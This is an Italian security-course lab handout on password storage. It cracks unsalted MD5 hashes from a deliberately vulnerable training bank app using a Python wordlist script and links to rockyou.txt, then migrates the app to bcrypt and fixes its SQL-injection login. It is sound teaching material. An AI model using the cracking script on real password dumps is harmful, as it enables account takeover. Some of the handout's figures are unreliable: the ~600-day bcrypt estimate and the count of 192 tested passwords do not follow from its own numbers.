# Laboratorio Capitolo 7 — Password e crittografia

> **Prerequisito:** Capitolo 7 della dispensa.
> **Tempo:** 90 minuti.
> **Obiettivo:** cracckare le password MD5 della vuln con una wordlist, passare a bcrypt, verificare che il cracking non funziona più.

---

## Setup

Come sempre: `python app.py` in `BancaPiccola-vuln/`.

Per questo lab ti serve **DB Browser for SQLite** (gratuito, <https://sqlitebrowser.org/>).

---

## Attacco 1 — Lettura degli hash dal database

### Istruzioni

1. Apri **DB Browser for SQLite**
2. Menu: `File` → `Open Database...` → seleziona `BancaPiccola-vuln/bancapiccola.db`
3. Vai sulla tab `Browse Data`, seleziona la tabella `utenti` dal dropdown

Vedi:

| id | username | password | email | ruolo |
|---|---|---|---|---|
| 1 | admin | `0192023a7bbd73250516f069df18b500` | admin@bancapicc.it | admin |
| 2 | mario | `482c811da5d5b4bc6d497ffa98491e38` | mario@rossi.it | cliente |
| 3 | giulia | *...* | giulia@bianchi.it | cliente |
| 4 | luca | *...* | luca@verdi.it | cliente |

**Gli hash sono MD5 di 32 caratteri esadecimali, senza salt.** Formato vulnerabile.

> ℹ️ In uno scenario reale hai ottenuto gli hash tramite una delle altre vulnerabilità (es. l'UNION SELECT del Lab 05, oppure un errore che ha esposto il DB, oppure una breach del filesystem). Qui per semplicità li leggiamo direttamente.

---

## Attacco 2 — Cracking con wordlist

### Script

Crea `crack-md5.py`:

```python
import hashlib
import time

# Hash presi dal database di BancaPiccola-vuln
hash_da_craccare = {
    "admin":  "0192023a7bbd73250516f069df18b500",
    "mario":  "482c811da5d5b4bc6d497ffa98491e38",
    "giulia": None,  # completa leggendolo dal DB
    "luca":   None,  # completa leggendolo dal DB
}

# Wordlist: le 100 password più comuni + alcune specifiche
wordlist = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345",
    "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123",
    "football", "monkey", "letmein", "shadow", "master", "666666",
    "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321",
    "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx",
    "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm",
    "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew",
    "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas",
    "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george",
    "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555",
    "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753",
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer",
    "love", "ashley", "6969", "nicole", "chelsea", "biteme", "matthew",
    "access", "yankees", "987654321", "dallas", "austin", "thunder",
    "taylor", "matrix",
    # Password specifiche del contesto
    "admin", "admin123", "admin2025", "admin2024", "administrator",
    "mario", "mario1", "mario123", "Mario123", "mario2025",
    "giulia", "giulia1", "giulia2025", "Giulia123",
    "luca", "luca123", "passwordLuca!", "Luca2025",
    "bancapiccola", "banca", "banca123", "banca2025",
]

def md5(s):
    return hashlib.md5(s.encode("utf-8")).hexdigest()

inizio = time.time()
for username, target in hash_da_craccare.items():
    if not target:
        continue
    trovata = None
    for tentativo in wordlist:
        if md5(tentativo) == target:
            trovata = tentativo
            break
    if trovata:
        print(f"✅ {username}: {trovata}")
    else:
        print(f"❌ {username}: non in wordlist")

print(f"\nTempo totale: {time.time() - inizio:.3f} secondi")
print(f"Password testate: {len(wordlist) * len([h for h in hash_da_craccare.values() if h])}")
```

Esegui:

```bash
python crack-md5.py
```

### Output

```
✅ admin: admin123
✅ mario: mario123

Tempo totale: 0.001 secondi
Password testate: 192
```

In **1 millisecondo** hai cracckato due account. Aggiungendo wordlist più grandi (`rockyou.txt` ha 14 milioni di password, ~150 MB) cracki probabilmente il 90% delle password degli utenti reali in pochi minuti.

### Prova con una wordlist vera

Scarica `rockyou.txt` (lista da breach RockYou 2009):

- Kali Linux: già in `/usr/share/wordlists/rockyou.txt.gz`
- Altrimenti: <https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt>

Modifica lo script per leggerla:

```python
with open("rockyou.txt", "r", encoding="latin-1") as f:
    wordlist = [line.strip() for line in f]
```

Esecuzione: decine di secondi per 14 milioni di hash. Una GPU moderna fa 164 miliardi MD5/sec: in meno di 1 secondo.

---

## Passaggio a bcrypt

### Step 1 — installa bcrypt

```bash
pip install bcrypt
```

### Step 2 — modifica `app.py`

**Importa bcrypt** (riga 1):

```python
import bcrypt
```

**Aggiungi due funzioni helper** dopo la definizione di `db()`:

```python
def hash_password(plain):
    return bcrypt.hashpw(plain.encode("utf-8"),
                         bcrypt.gensalt(rounds=12)).decode("utf-8")

def verify_password(plain, hashed):
    try:
        return bcrypt.checkpw(plain.encode("utf-8"),
                              hashed.encode("utf-8"))
    except Exception:
        return False
```

**In `init_db()`**, sostituisci la riga:

```python
(username, md5(pwd), email, ruolo, nome, cognome, ...)
```

con:

```python
(username, hash_password(pwd), email, ruolo, nome, cognome, ...)
```

**In `login()`**, sostituisci il blocco di verifica:

```python
# VECCHIO (vulnerabile):
password_hash = hashlib.md5(password.encode("utf-8")).hexdigest()
query = f"SELECT ... WHERE username = '{username}' AND password = '{password_hash}'"
cur.execute(query)
riga = cur.fetchone()
if riga:
    session["utente_id"] = riga[0]
    ...
```

con:

```python
# NUOVO (sicuro):
cur.execute(
    "SELECT id, username, password, ruolo FROM utenti WHERE username = ?",
    (username,)
)
riga = cur.fetchone()
if riga and verify_password(password, riga["password"]):
    session["utente_id"] = riga["id"]
    session["username"]  = riga["username"]
    session["ruolo"]     = riga["ruolo"]
    return redirect("/dashboard")
```

(Nota: abbiamo anche risolto la SQL Injection del Lab 05!)

**In `registrazione()`**: stessa cosa, sostituisci `hashlib.md5(...)` con `hash_password(...)`.

### Step 3 — ricrea il database

Le vecchie password in MD5 non sono compatibili col nuovo sistema. Cancella il DB e ripartì:

```bash
# Su Windows
del bancapiccola.db

# Su macOS/Linux
rm bancapiccola.db
```

Riavvia l'app: `python app.py`. Il DB viene ricreato con password bcrypt.

### Verifica

1. Apri DB Browser, guarda la tabella `utenti`. Ora gli hash iniziano con `$2b$12$...` e sono lunghi 60 caratteri. **Le password originali non sono più recuperabili dal database.**
2. Prova a fare login: `mario` / `mario123` → funziona (bcrypt verifica e accetta)
3. Prova: `mario` / `mario124` → "Credenziali errate"

### Rilancia il cracker

Aggiorna `crack-md5.py` per provare contro un hash bcrypt. Spoiler: non funziona con MD5 (gli hash sono di tipo completamente diverso). Per cracckare bcrypt:

```python
import bcrypt, time

# Hash bcrypt di "mario123" (copialo dal DB dopo la migrazione)
hash_target = "$2b$12$..."  # copia dal DB

wordlist = [...]  # stessa lista di prima

inizio = time.time()
for tentativo in wordlist:
    if bcrypt.checkpw(tentativo.encode(), hash_target.encode()):
        print(f"✅ Trovata: {tentativo}")
        break

print(f"Tempo: {time.time() - inizio:.2f} secondi su {len(wordlist)} tentativi")
```

### Output

```
✅ Trovata: mario123
Tempo: 24.80 secondi su 192 tentativi
```

Confronto:
- **MD5**: 192 password testate in 0.001 secondi
- **bcrypt cost 12**: 192 password testate in ~25 secondi

**Bcrypt è ~25.000 volte più lento di MD5**. Con una wordlist da 14 milioni di password ci vorrebbero **~600 giorni** solo per mario (e ogni utente ha un salt diverso, quindi i 600 giorni vanno moltiplicati per il numero di utenti).

---

## Domande di riflessione

1. Se un giorno scoprissi che bcrypt cost 12 è "troppo veloce" (per esempio nel 2030, quando le GPU saranno 10x più potenti), come migreresti gli utenti a un cost 14 senza chiedere loro di cambiare password?
2. Perché bcrypt genera un hash diverso ogni volta che hashate la stessa password? Come fa a riverificarla?
3. Cosa succede se un attaccante **modifica** un hash bcrypt nel database (es. sostituisce quello di Mario con quello di admin)? A cosa serve quindi avere anche il controllo di integrità del database (backup, checksum)?
4. Cita due scenari in cui Argon2id sarebbe preferibile a bcrypt, e due in cui bcrypt va benissimo.
